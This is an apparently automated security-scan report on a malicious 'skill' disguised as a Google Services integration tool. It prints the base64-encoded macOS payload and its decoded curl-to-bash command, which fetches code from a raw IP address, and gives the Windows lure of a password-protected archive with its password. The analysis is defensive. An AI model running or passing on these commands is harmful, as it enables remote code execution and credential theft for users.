findings.title: Malicious Command Injection via Base64-Encoded Payload
findings.description: The macOS installation instructions contain a base64-encoded malicious command that downloads and executes arbitrary code from an untrusted external server (91.92.242.30). The command decodes to: '/bin/bash -c "$(curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp)"' which performs remote code execution without user consent or verification. This is a classic supply chain attack vector disguised as legitimate installation instructions.
findings.remediation: IMMEDIATE ACTION REQUIRED: Do not execute this command. Remove this skill entirely. The base64-encoded payload is designed to download and execute malicious code from an external server. Legitimate software installation should never use obfuscated commands or download executables from IP addresses. Report this skill to the platform administrators.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: Base64-decoded command clearly shows remote code execution from an IP address (not a trusted domain). The obfuscation, use of IP instead of domain, and random-looking path (/q0c7ew2ro8l2cfqp) are all strong indicators of malicious intent.
metadata.meta_exploitability: Trivial - User just needs to copy-paste the command as instructed
metadata.meta_impact: Critical - Full system compromise, arbitrary code execution with user privileges, potential credential theft, data exfiltration, and persistent backdoor installation

findings.title: Credential Theft via Fake OAuth Dependency
findings.description: The skill claims to require 'openclaw-core utility' for Google OAuth authentication, but this appears to be a fake dependency designed to steal Google credentials. The Windows download link points to a suspicious GitHub repository (denboss99/openclaw-core) with password-protected archives, and the macOS command downloads from an IP address rather than a legitimate domain. This is a credential harvesting attack masquerading as a legitimate OAuth helper.
findings.snippet: Prerequisites section claims Google OAuth requires 'openclaw-core' with suspicious download sources: password-protected zip from unknown GitHub repo and base64-obfuscated command downloading from IP 91.92.242.30
findings.remediation: Do not install any 'openclaw-core' utility. Legitimate Google OAuth integration does not require third-party utilities with obfuscated installation commands. Google provides official OAuth libraries that should be used instead. Remove this skill and scan your system for compromise if you have already executed these commands.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: Multiple red flags: (1) Google OAuth doesn't require external utilities, (2) password-protected archives to bypass AV, (3) suspicious GitHub account (denboss99), (4) macOS version downloads from IP address instead of legitimate domain, (5) fake 'setup-service.com' domain in macOS command
metadata.meta_exploitability: Easy - Social engineering attack that exploits user trust in 'prerequisites'
metadata.meta_impact: Critical - Complete compromise of Google account credentials (Gmail, Drive, Calendar, Contacts), enabling data theft, email access, document exfiltration, and potential lateral movement to other services

findings.title: Social Engineering via Deceptive Skill Description
findings.description: The skill presents itself as a legitimate Google Services integration tool, but the actual purpose is to trick users into installing malware through fake 'prerequisites'. The description mentions Gmail, Calendar, Drive, Contacts, Sheets, and Docs integration, creating false trust, while the real payload is malicious code execution. This is a classic social engineering attack using trusted brand names (Google, OAuth) to appear legitimate.
findings.snippet: Skill claims to provide Google services integration but immediately directs users to install suspicious 'openclaw-core' utility with obfuscated malicious payloads
findings.remediation: Do not trust skills that require external utility installations, especially those with obfuscated commands or password-protected archives. Legitimate API integrations should use standard OAuth flows without additional binary dependencies. Verify skill authenticity through official channels before use.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: The entire skill structure is designed for deception: legitimate-looking API docs, trusted brand name (Google), professional formatting, but malicious prerequisites. This is a sophisticated social engineering attack.
metadata.meta_exploitability: Medium - Requires user to trust the skill and follow installation instructions
metadata.meta_impact: High - Enables the malware installation that leads to credential theft and data exfiltration

findings.title: Code Obfuscation to Hide Malicious Intent
findings.description: The macOS installation command uses base64 encoding to obfuscate the actual command being executed. This is a deliberate attempt to hide malicious intent from users and security scanners. The obfuscated command downloads and executes arbitrary code from an IP address (91.92.242.30) rather than a legitimate domain, which is a strong indicator of malicious activity.
findings.snippet: Base64-encoded command: 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC9xMGM3ZXcycm84bDJjZnFwKSI=' decodes to remote code execution
findings.remediation: Never execute base64-encoded commands without first decoding and verifying their contents. Legitimate software should provide transparent installation instructions. This obfuscation technique is commonly used in malware to evade detection.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: Base64 encoding combined with curl piped to bash is a well-known malware distribution technique. Legitimate software doesn't hide installation commands this way.
metadata.meta_exploitability: Trivial - User executes the command as instructed
metadata.meta_impact: Critical - Same as finding #2, enables arbitrary code execution

findings.title: Misleading Installation Instructions with Fake Download Links
findings.description: The Windows installation instructions direct users to download from 'github.com/denboss99/openclaw-core/releases' with a password-protected archive (password: 'openclaw'). Password-protected archives in software distribution are highly suspicious and often used to bypass antivirus scanning. The use of a password suggests the contents would be flagged by security software if scanned directly.
findings.snippet: Windows download: password-protected zip from github.com/denboss99/openclaw-core/releases/download/v3/openclawcore-1.0.3.zip with password 'openclaw'
findings.remediation: Legitimate open-source software does not distribute password-protected archives. This technique is used to prevent antivirus software from scanning the contents before extraction. Do not download or extract this file.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: Password-protected archives in software distribution are a well-known malware evasion technique. Combined with other indicators (suspicious GitHub account, fake dependency), this confirms malicious intent.
metadata.meta_exploitability: Easy - User just needs to extract with provided password
metadata.meta_impact: Medium - Enables malware installation, but requires user action to extract and run

findings.title: Potential Data Exfiltration via Google API Access
findings.description: If the malicious 'openclaw-core' utility is installed, it would have access to all Google services mentioned (Gmail, Calendar, Drive, Contacts, Sheets, Docs). This would enable comprehensive data exfiltration of emails, documents, contacts, calendar events, and files stored in Google Drive. The skill's legitimate-looking API documentation serves as cover for this data theft capability.
findings.snippet: Skill requests access to gmail, calendar, drive, contacts, sheets, and docs services with full read/write capabilities
findings.remediation: If you have installed the 'openclaw-core' utility, immediately revoke all Google OAuth tokens, change your Google account password, enable 2FA, and review your Google account activity for unauthorized access. Scan your system for malware.

metadata.overall_assessment: CRITICAL SECURITY THREAT - DO NOT USE THIS SKILL. This is a sophisticated malware distribution attack disguised as a legitimate Google Services integration tool. The skill uses social engineering (trusted Google brand), obfuscated malicious code (base64-encoded remote code execution), and fake dependencies (openclaw-core) to trick users into installing malware that can steal credentials and exfiltrate data from Google services. The macOS installation command downloads and executes arbitrary code from an IP address (91.92.242.30), and the Windows version uses password-protected archives to evade antivirus detection. This skill should be reported immediately and removed from any skill repository.
metadata.meta_confidence_reason: The skill's API documentation is legitimate-looking, but in context of the malicious prerequisites, this broad access would enable data theft. However, the actual exfiltration depends on the malware payload, which we cannot analyze directly.
metadata.meta_exploitability: Medium - Requires successful malware installation and OAuth grant
metadata.meta_impact: Medium-High - Comprehensive data access, but actual exfiltration depends on malware behavior
